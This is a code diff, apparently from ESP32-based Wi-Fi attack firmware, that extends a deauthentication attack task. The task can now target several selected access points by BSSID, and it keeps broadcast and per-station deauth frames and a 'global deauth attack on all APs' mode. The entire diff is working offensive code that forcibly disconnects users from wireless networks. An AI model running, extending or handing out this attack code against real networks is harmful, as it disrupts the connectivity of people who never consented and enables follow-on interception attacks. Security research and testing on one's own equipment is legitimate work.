@@ -1535,11 +1535,10 @@ void wifi_deauth_task(void *param) {
     uint32_t last_log = 0;
     
     while (1) {
-        if (strlen((const char *)selected_ap.ssid) > 0) {
-            for (int i = 0; i < ap_count; i++) {
-                if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap.ssid) == 0) {
-                    // Deauth on the AP's channel
-                    {
+        if (selected_ap_count > 0 && selected_aps != NULL) {
+            for (int sel_idx = 0; sel_idx < selected_ap_count; sel_idx++) {
+                for (int i = 0; i < ap_count; i++) {
+                    if (memcmp(ap_info[i].bssid, selected_aps[sel_idx].bssid, 6) == 0) {
                         int ch = ap_info[i].primary;
                         uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                         wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
@@ -1550,6 +1549,20 @@ void wifi_deauth_task(void *param) {
                         }
                         vTaskDelay(pdMS_TO_TICKS(50));
                     }
+                }
+            }
+        } else if (strlen((const char *)selected_ap.ssid) > 0) {
+            for (int i = 0; i < ap_count; i++) {
+                if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap.ssid) == 0) {
+                    int ch = ap_info[i].primary;
+                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                    wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
+                    for (int j = 0; j < station_count; j++) {
+                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                            wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                        }
+                    }
+                    vTaskDelay(pdMS_TO_TICKS(50));
                 }
             }
         } else {
@@ -1583,6 +1596,30 @@ void wifi_manager_start_deauth() {
         ap_manager_stop_services();
         esp_wifi_start();
         printf("Restarting Wi-Fi\n");
+        
+        if (selected_ap_count > 0 && selected_aps != NULL) {
+            printf("Starting deauth attack on %d selected APs:\n", selected_ap_count);
+            TERMINAL_VIEW_ADD_TEXT("Starting deauth attack on %d selected APs:\n", selected_ap_count);
+            
+            for (int i = 0; i < selected_ap_count; i++) {
+                char sanitized_ssid[33];
+                sanitize_ssid_and_check_hidden(selected_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
+                printf("  [%d] %s (%02X:%02X:%02X:%02X:%02X:%02X)\n", 
+                       i, sanitized_ssid,
+                       selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
+                       selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5]);
+                TERMINAL_VIEW_ADD_TEXT("  [%d] %s\n", i, sanitized_ssid);
+            }
+        } else if (strlen((const char *)selected_ap.ssid) > 0) {
+            char sanitized_ssid[33];
+            sanitize_ssid_and_check_hidden(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));
+            printf("Starting deauth attack on selected AP: %s\n", sanitized_ssid);
+            TERMINAL_VIEW_ADD_TEXT("Starting deauth attack on selected AP: %s\n", sanitized_ssid);
+        } else {
+            printf("Starting global deauth attack on all APs\n");
+            TERMINAL_VIEW_ADD_TEXT("Starting global deauth attack on all APs\n");
+        }
+        
         xTaskCreate(wifi_deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
         beacon_task_running = true;
         rgb_manager_set_color(&rgb_manager, -1, 255, 0, 0, false);
